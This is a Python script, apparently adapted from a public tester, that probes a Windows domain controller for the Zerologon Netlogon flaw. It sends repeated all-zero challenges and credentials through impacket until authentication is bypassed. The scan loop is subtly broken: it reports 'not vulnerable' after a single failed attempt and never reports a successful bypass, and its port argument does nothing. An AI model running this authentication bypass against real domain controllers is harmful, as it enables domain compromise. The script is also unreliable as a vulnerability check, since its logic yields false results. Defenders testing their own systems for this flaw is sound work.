#!/usr/bin/env python3
# Source: ?

import sys
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5 import transport


# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
    print(msg, file=sys.stderr)
    print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
    sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
    # Connect to the DC's Netlogon service.
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212fffff

    # Send challenge and authentication request.
    try:
        nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
        server_auth = nrpc.hNetrServerAuthenticate3(
          rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
          target_computer + '\x00', ciphertext, flags
        )
        # It worked!
        assert server_auth['ErrorCode'] == 0
        return rpc_con
    except nrpc.DCERPCSessionError as ex:
        print(ex)
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
              return None
        else:
            print(f'Unexpected error code from DC: {ex.get_error_code()}.')
            # fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
            return False  
    except BaseException as ex:
        print(f'Unexpected error: {ex}.')
        # fail(f'Unexpected error: {ex}.')
        return False

def scan(dc_handle, dc_ip, target_computer, port=135):
    # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
    rpc_con = None
    for attempt in range(0, MAX_ATTEMPTS):
        rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
        if rpc_con == False:
            return
        if not rpc_con:
            print('=', end='', flush=True)
        else:
            break
        if rpc_con:
            return {"ip":dc_ip, "port":'', "vulnerableToZeroLogon":True, "dc_name": target_computer}
        else:
            return {"ip":dc_ip, "port":'', "vulnerableToZeroLogon":False, "dc_name": target_computer}


if __name__ == '__main__':
    if not 3 <= len(sys.argv) <= 4:
        print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
        print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
        print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
        sys.exit(1)
    else:
        [_, dc_name, dc_ip] = sys.argv

        dc_name = dc_name.rstrip('$')
        print(f"Scanning for Zerologon attack on ip:{dc_ip}, dc name:{dc_name}, port=135...")
        results = scan('\\\\' + dc_name, dc_ip, dc_name, port=135)
        if results:
            results_csv = ''.join([f"{results[i]}," if i != list(results)[-1] else f"{results[i]}" for i in results])
            print(f"\nResults = {results_csv}")
